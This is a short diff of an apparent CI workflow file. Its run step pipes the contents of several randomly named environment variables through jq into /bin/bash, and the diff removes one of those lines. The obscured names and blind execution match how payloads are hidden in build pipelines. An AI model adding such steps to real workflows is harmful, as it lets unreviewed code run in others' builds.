@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$hkibn7479" | jq -r .oo9 | /bin/bash
           printf '%s' "$ppc0544" | jq -r .hdpwj30169 | /bin/bash
-          echo $djdv79 | jq -r .qjyad1949 | /bin/bash
           printf '%s' "$du496" | jq -r .qgym96552 | /bin/bash
 
       - name: Archive output
